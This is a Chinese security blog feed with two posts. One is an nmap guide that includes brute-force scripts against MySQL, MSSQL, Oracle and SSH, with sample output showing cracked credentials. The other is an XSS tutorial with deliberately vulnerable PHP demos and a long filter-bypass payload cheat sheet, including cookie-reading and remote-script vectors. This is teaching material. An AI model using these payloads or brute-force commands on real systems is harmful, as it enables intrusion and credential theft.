&lt;h2 id=&quot;网段扫描格式&quot;&gt;网段扫描格式&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sP &amp;lt;network address &amp;gt; &amp;lt;/CIDR &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;解释CIDR 为你设置的子网掩码&lt;code&gt;(/24 , /16 ,/8 等)&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;10.1.1.0/24  =  10.1.1.1-10.1.1.255       #c段扫描10.1.1.0/16  =  10.1.1.1-10.1.255.255     #b段扫描10.1.1.0/8   =  10.1.1.1-10.255.255.255   #a段扫描
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;从文件中读取需要扫描的ip列表&quot;&gt;从文件中读取需要扫描的IP列表&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -iL ip-address.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;路由跟踪扫描&quot;&gt;路由跟踪扫描&lt;/h2&gt;

&lt;p&gt;路由器追踪功能能够帮网络管理员了解网络通行情况同时也是网络管理人员很好的辅助工具通过路由器追踪可以轻松的查处从我们电脑所在地到目标地之间所经常的网络节点并可以看到通过各个节点所花费的时间&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -traceroute www.baidu.com
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;a-os识别版本探测脚本扫描和traceroute综合扫描&quot;&gt;A OS识别,版本探测,脚本扫描和traceroute综合扫描&lt;/h2&gt;

&lt;p&gt;此选项设置包含了1-10000的端口ping扫描操作系统扫描脚本扫描路由跟踪服务探测。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -A 10.130.1.43
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;命令混合式扫描&quot;&gt;命令混合式扫描&lt;/h2&gt;

&lt;p&gt;命令混合扫描可以做到类似参数-A所完成的功能但又能细化到我们所需特殊要求。所以一般高手选择这个混合扫描&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -vv -p1-100,3306,3389 -O -traceroute 10.130.1.43
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;输出格式&quot;&gt;输出格式&lt;/h2&gt;

&lt;p&gt;扫描的结果输出到屏幕,同时会存储一份到grep-output.txt&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;扫描结果输出为html&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sS -sV -T5 10.0.1.99 --webxml -oX - | xsltproc --output file.html
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;nmap高级用法之脚本使用&quot;&gt;nmap高级用法之脚本使用&lt;/h1&gt;

&lt;h2 id=&quot;按照脚本分类进行扫描&quot;&gt;按照脚本分类进行扫描&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap --script 类别
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;nmap官方脚本文档: &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nmap.org/nsedoc/&quot;&gt;https://nmap.org/nsedoc/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;nmap脚本分类:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;- auth: 负责处理鉴权证书绕开鉴权的脚本  
- broadcast: 在局域网内探查更多服务开启状况如dhcp/dns/sqlserver等服务  
- brute: 提供暴力破解方式针对常见的应用如http/snmp等  
- default: 使用-sC或-A选项扫描时候默认的脚本提供基本脚本扫描能力  
- discovery: 对网络进行更多的信息如SMB枚举、SNMP查询等  
- dos: 用于进行拒绝服务攻击  
- exploit: 利用已知的漏洞入侵系统  
- external: 利用第三方的数据库或资源例如进行whois解析  
- fuzzer: 模糊测试的脚本发送异常的包到目标机探测出潜在漏洞 
- intrusive: 入侵性的脚本此类脚本可能引发对方的IDS/IPS的记录或屏蔽- malware: 探测目标机是否感染了病毒、开启了后门等信息  
- safe: 此类与intrusive相反属于安全性脚本  
- version: 负责增强服务与版本扫描Version Detection功能的脚本  
- vuln: 负责检查目标机是否有常见的漏洞Vulnerability如是否有MS08_067
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;使用具体脚本进行扫描&quot;&gt;使用具体脚本进行扫描&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap --script 具体的脚本 www.baidu.com
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;常用脚本使用案例&lt;/p&gt;

&lt;h4 id=&quot;扫描服务器的常见漏洞&quot;&gt;扫描服务器的常见漏洞&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap --script vuln &amp;lt;target&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;检查ftp是否开启匿名登陆&quot;&gt;检查FTP是否开启匿名登陆&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap --script ftp-anon &amp;lt;target&amp;gt;PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner| d--x--x--x   2 root     root         1024 Jan 14  2002 bin| d--x--x--x   2 root     root         1024 Aug 10  1999 etc| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]
| d--x--x--x   2 root     root         1024 Jan 14  2002 lib| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub
|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;对mysql进行暴破解&quot;&gt;对MySQL进行暴破解&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap --script=mysql-brute &amp;lt;target&amp;gt;3306/tcp open  mysql
| mysql-brute:
|   Accounts
|     root:root - Valid credentials
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;对mssql进行暴破解&quot;&gt;对MsSQL进行暴破解&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt &amp;lt;host&amp;gt;
| ms-sql-brute:
|   [192.168.100.128\TEST]
|     No credentials found
|     Warnings:
|       sa: AccountLockedOut
|   [192.168.100.128\PROD]
|     Credentials found:
|       webshop_reader:secret =&amp;gt; Login Success
|       testuser:secret1234 =&amp;gt; PasswordMustChange
|_      lordvader:secret1234 =&amp;gt; Login Success
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;对oracle数据库进行暴破解&quot;&gt;对Oracle数据库进行暴破解&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL &amp;lt;host&amp;gt;
PORT     STATE  SERVICE REASON1521/tcp open  oracle  syn-ack
| oracle-brute:
|   Accounts
|     system:powell =&amp;gt; Account locked
|     haxxor:haxxor =&amp;gt; Valid credentials
|   Statistics
|_    Perfomed 157 guesses in 8 seconds, average tps: 19
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;对ssh进行暴力破解&quot;&gt;对SSH进行暴力破解&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s &amp;lt;target&amp;gt;22/ssh open  ssh
| ssh-brute:
|  Accounts
|    username:password
|  Statistics
|_   Performed 32 guesses in 25 seconds.
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;利用dns进行子域名暴力破解&quot;&gt;利用DNS进行子域名暴力破解&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap --script dns-brute www.baidu.com
λ nmap --script dns-brute www.baidu.com                      

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-25 13:12 ?
Nmap scan report for www.baidu.com (180.97.33.108)           
Host is up (0.018s latency).                                 
Other addresses for www.baidu.com (not scanned): 180.97.33.10Not shown: 998 filtered ports                                
PORT    STATE SERVICE                                        
80/tcp  open  http                                           
443/tcp open  https                                          

Host script results:                                         
| dns-brute:                                &amp;amp;n                
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">xss</title><link href="http://localhost:4000/_posts/2020-07-11-xss/" rel="alternate" type="text/html" title="xss" /><published>2020-07-11T00:00:00-04:00</published><updated>2020-07-11T00:00:00-04:00</updated><id>http://localhost:4000/_posts/xss</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-11-xss/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;xss概念&quot;&gt;XSS概念&lt;/h1&gt;

&lt;p&gt;跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
 xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是&lt;strong&gt;寻找参数未过滤的输出函数&lt;/strong&gt;。
 常见的输出函数有： &lt;code&gt;echo printf print print_r sprintf die var-dump var_export&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;分类&quot;&gt;分类&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;反射型XSS：**&lt;非持久化&gt;** 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。&lt;/非持久化&gt;&lt;/li&gt;
  &lt;li&gt;存储型XSS：**&lt;持久化&gt;** 代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）&lt;/持久化&gt;&lt;/li&gt;
  &lt;li&gt;DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;原理&quot;&gt;原理&lt;/h1&gt;

&lt;h2 id=&quot;反射型&quot;&gt;反射型&lt;/h2&gt;

&lt;p&gt;新建一个xss.php文件并加入以下代码:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;\\XSS反射演示  
&amp;lt;form action=&quot;&quot; method=&quot;get&quot;&amp;gt;  
    &amp;lt;input type=&quot;text&quot; name=&quot;xss&quot;/&amp;gt;  
    &amp;lt;input type=&quot;submit&quot; value=&quot;test&quot;/&amp;gt;  
&amp;lt;/form&amp;gt;  
&amp;lt;?php  
    $xss = @$_GET['xss'];  
    if($xss!==null){  
        echo $xss;  
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这段代码中首先包含一个表单，用于向页面自己发送&lt;code&gt;GET&lt;/code&gt;请求，带一个名为xss的参数。 然后PHP会读取该参数，如果不为空，则直接打印出来，这里不存在任何过滤。也就是说，如果xss中存在HTML结构性的内容，打印之后会直接解释为HTML元素。&lt;/p&gt;

&lt;p&gt;直接输入一个js代码，比如&lt;code&gt;&amp;lt;script&amp;gt;alert('hack')&amp;lt;/script&amp;gt;&lt;/code&gt;可以看到触发弹窗&lt;/p&gt;

&lt;h2 id=&quot;存储型&quot;&gt;存储型&lt;/h2&gt;

&lt;p&gt;把xss.php内容改为下述内容:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;\\存储XSS演示  
&amp;lt;form action=&quot;&quot; method=&quot;post&quot;&amp;gt;  
    &amp;lt;input type=&quot;text&quot; name=&quot;xss&quot;/&amp;gt;  
    &amp;lt;input type=&quot;submit&quot; value=&quot;test&quot;/&amp;gt;  
&amp;lt;/form&amp;gt;  
&amp;lt;?php  
    $xss=@$_POST['xss'];  
    mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123&quot;);  
    mysql_select_db(&quot;xss&quot;);  
    if($xss!==null){  
        $sql=&quot;insert into temp(id,payload) values('1','$xss')&quot;;  
        $result=mysql_query($sql);  
        echo $result;  
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;用户输入的内容还是没有过滤，但是不直接显示在页面中，而是插入到了数据库&lt;/p&gt;

&lt;p&gt;新建show.php，内容为：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;?php 
    mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);  
    mysql_select_db(&quot;xss&quot;);  
    $sql=&quot;select payload from temp where id=1&quot;;  
    $result=mysql_query($sql);  
    while($row=mysql_fetch_array($result)){  
        echo $row['payload'];  
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;该代码从数据库读取了之前插入的内容，并将其显示出来&lt;/p&gt;

&lt;p&gt;直接输入一个js代码，比如&lt;code&gt;&amp;lt;script&amp;gt;alert('hack')&amp;lt;/script&amp;gt;&lt;/code&gt;可以看到触发弹窗,且保存到数据库中了&lt;/p&gt;

&lt;h2 id=&quot;dom型&quot;&gt;DOM型&lt;/h2&gt;

&lt;p&gt;把xss.php内容改为&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;?php  
    error_reporting(0); //禁用错误报告  
    $name = $_GET[&quot;name&quot;];  
?&amp;gt;  
&amp;lt;input id=&quot;text&quot; type=&quot;text&quot; value=&quot;&amp;lt;?php echo $name;?&amp;gt;&quot; /&amp;gt;  
&amp;lt;div id=&quot;print&quot;&amp;gt;&amp;lt;/div&amp;gt;  
&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;  
    var text = document.getElementById(&quot;text&quot;);   
    var print = document.getElementById(&quot;print&quot;);  
    print.innerHTML = text.value; // 获取 text的值，并且输出在print内。这里是导致xss的主要原因。  
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在URL构造：&lt;em&gt;?name=&amp;lt; img src=1 onerror = alert(xss)&amp;gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;触发弹窗&lt;/p&gt;

&lt;h1 id=&quot;绕过过滤器&quot;&gt;绕过过滤器&lt;/h1&gt;

&lt;h2 id=&quot;xss定位器&quot;&gt;XSS定位器&lt;/h2&gt;

&lt;p&gt;在大多数存在漏洞且不需要特定XSS攻击代码的地方插入下列代码会弹出包含“XSS”字样的对话框。使用URL编码器来对整个代码进行编码。小技巧：如果你时间很紧想要快速检查页面，通常只要插入“&lt;任意文本&gt;”标签，然后观察页面输出是否明显改变了就可以判断是否存在漏洞：&lt;/任意文本&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//&quot;;

alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--

&amp;gt;&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;'&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(String.fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果你没有足够的空间并且知道页面上没有存在漏洞的JavaScript，这个字符串是一个不错的简洁XSS注入检查。注入后查看页面源代码并且寻找是否存在&lt;strong&gt;&amp;lt;XSS&lt;/strong&gt; 或&lt;strong&gt;&amp;lt;XSS&lt;/strong&gt;字样来确认是否存在漏洞&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;'';!--&quot;&amp;lt;XSS&amp;gt;=&amp;amp;{()}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;无过滤绕过&quot;&gt;无过滤绕过&lt;/h2&gt;

&lt;p&gt;这是一个常规的XSS注入代码，虽然通常它会被防御，但是建议首先去测试一下。（引号在任何现代浏览器中都不需要，所以这里省略了它）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT SRC=http://xss.rocks/xss.js&amp;gt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;利用多语言进行过滤绕过&quot;&gt;利用多语言进行过滤绕过&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;'&quot;&amp;gt;&amp;gt;&amp;lt;marquee&amp;gt;&amp;lt;img src=x onerror=confirm(1)&amp;gt;&amp;lt;/marquee&amp;gt;&quot;&amp;gt;&amp;lt;/plaintext\&amp;gt;&amp;lt;/|\&amp;gt;&amp;lt;plaintext/onmouseover=prompt(1)&amp;gt;

&amp;lt;script&amp;gt;prompt(1)&amp;lt;/script&amp;gt;@gmail.com&amp;lt;isindex formaction=javascript:alert(/XSS/) type=submit&amp;gt;'--&amp;gt;&quot;&amp;gt;&amp;lt;/script&amp;gt;

&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&quot;&amp;gt;

&amp;lt;img/id=&quot;confirm&amp;amp;lpar;1)&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id)&amp;gt;'&quot;&amp;gt;

&amp;lt;img src=&quot;http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;通过javascript命令实现的图片xss&quot;&gt;通过JavaScript命令实现的图片XSS&lt;/h2&gt;

&lt;p&gt;图片注入使用JavaScript命令实现（IE7.0 不支持在图片上下文中使用JavaScript 命令，但是可以在其他上下文触发。下面的例子展示了一种其他标签依旧通用的原理）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;无分号无引号&quot;&gt;无分号无引号&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=javascript:alert('XSS')&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;不区分大小写的xss攻击向量&quot;&gt;不区分大小写的XSS攻击向量&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=JaVaScRiPt:alert('XSS')&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;html实体&quot;&gt;HTML实体&lt;/h2&gt;

&lt;p&gt;必须有分号才可生效&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=javascript:alert(&amp;amp;quot;XSS&amp;amp;quot;)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;重音符混淆&quot;&gt;重音符混淆&lt;/h2&gt;

&lt;p&gt;如果你的JavaScript代码中需要同时使用单引号和双引号，那么可以使用重音符（`）来包含JavaScript 代码。这通常会有很大帮助，因为大部分跨站脚本过滤器都没有过滤这个字符&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=`javascript:alert(&quot;RSnake says, 'XSS'&quot;)`&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;畸形的a标签&quot;&gt;畸形的A标签&lt;/h2&gt;

&lt;p&gt;跳过HREF标签找到XSS的重点。。。由DavidCross提交~已在Chrome上验证&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;a onmouseover=&quot;alert(document.cookie)&quot;&amp;gt;xxs link&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;此外Chrome经常帮你补全确实的引号。。。如果在这方面遇到问题就直接省略引号，Chrome会帮你补全在URL或脚本中缺少的引号&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;a onmouseover=alert(document.cookie)&amp;gt;xxs link&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;畸形的img标签&quot;&gt;畸形的IMG标签&lt;/h2&gt;

&lt;p&gt;最初由Begeek发现（短小精湛适用于所有浏览器），这个XSS攻击向量使用了不严格的渲染引擎来构造含有IMG标签并被引号包含的XSS攻击向量。我猜测这种解析原来是为了兼容不规范的编码。这会让它更加难以正确的解析HTML标签&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG &quot;&quot;&quot;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&quot;XSS&quot;)&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;fromcharcode函数&quot;&gt;fromCharCode函数&lt;/h2&gt;

&lt;p&gt;如果不允许任何形式的引号，你可以通过执行JavaScript里的fromCharCode函数来创建任何你需要的XSS攻击向量&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用默认src属性绕过src域名过滤器&quot;&gt;使用默认SRC属性绕过SRC域名过滤器&lt;/h2&gt;

&lt;p&gt;这种方法可以绕过大多数SRC域名过滤器。将JavaScript代码插入事件方法同样适用于注入使用elements的任何HTML标签，例如Form,Iframe, Input,  Embed等等。它同样允许将事件替换为任何标签中可用的事件类型，例如onblur,onclick。下面会给出许多不同的可注入事件列表。由David Cross提交，Abdullah Hussam(@Abdulahhusam)编辑&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=# onmouseover=&quot;alert('xxs')&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用默认为空的src属性&quot;&gt;使用默认为空的SRC属性&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC= onmouseover=&quot;alert('xxs')&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用不含src属性&quot;&gt;使用不含SRC属性&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG onmouseover=&quot;alert('xxs')&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;通过error事件触发alert&quot;&gt;通过error事件触发alert&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&amp;gt;&amp;lt;/img&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;对img标签中onerror属性进行编码&quot;&gt;对IMG标签中onerror属性进行编码&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;img src=x onerror=&quot;&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;十进制html字符实体编码&quot;&gt;十进制HTML字符实体编码&lt;/h2&gt;

&lt;p&gt;所有在IMG标签里直接使用javascript:形式的XSS示例无法在Firefox或Netscape8.1以上浏览器（使用Gecko渲染引擎）运行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt; &amp;lt;IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;
    &amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;不带分号的十进制html字符实体编码&quot;&gt;不带分号的十进制HTML字符实体编码&lt;/h2&gt;

&lt;p&gt;这对于绕过对“&amp;amp;#XX;”形式的XSS过滤非常有用，因为大多数人不知道最长可使用7位数字。这同样对例如$tmp_string  =~s/.&lt;em&gt;\&amp;amp;#(\d+);.&lt;/em&gt;/$1/;形式的过滤器有效，这种过滤器是错误的认为HTML字符实体编码需要用分号结尾（无意中发现的&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt; &amp;lt;IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;   #0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;不带分号的十六进制html字符实体编码&quot;&gt;不带分号的十六进制HTML字符实体编码&lt;/h2&gt;

&lt;p&gt;这是有效绕过例如$tmp_string =~ s/.&lt;em&gt;\&amp;amp;#(\d+);.&lt;/em&gt;/$1/;过滤器的方法。这种过滤器错误的认为#号后会跟着数字（十六进制HTML字符实体编码并非如此）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&amp;amp;#x6A&amp;amp;#x61&amp;amp;#x76&amp;amp;#x61&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;amp;#x3A&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27&amp;amp;#x58&amp;amp;#x53&amp;amp;#x53&amp;amp;#x27&amp;amp;#x29&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;内嵌tab&quot;&gt;内嵌TAB&lt;/h2&gt;

&lt;p&gt;使用TAB来分开XSS攻击代码&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;jav ascript:alert('XSS');&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;内嵌编码后tab&quot;&gt;内嵌编码后TAB&lt;/h2&gt;

&lt;p&gt;使用编码后的TAB来分开XSS攻击代码&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;jav&amp;amp;#x09;ascript:alert('XSS');&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;内嵌换行分隔xss攻击代码&quot;&gt;内嵌换行分隔XSS攻击代码&lt;/h2&gt;

&lt;p&gt;一些网站声称09到13（十进制）的HTML实体字符都可以实现这种攻击，这是不正确的。只有09（TAB），10（换行）和13（回车）有效。查看ASCII字符表获取更多细节。下面几个XSS示例介绍了这些向量&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;jav&amp;amp;#x0A;ascript:alert('XSS');&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;内嵌回车分隔xss攻击代码&quot;&gt;内嵌回车分隔XSS攻击代码&lt;/h2&gt;

&lt;p&gt;注意：上面使用了比实际需要长的字符串是因为0可以忽略。经常可以遇到过滤器解码十六进制和十进制编码时认为只有2到3位字符。实际规则是1至7位字符&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;jav&amp;amp;#x0D;ascript:alert('XSS');&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

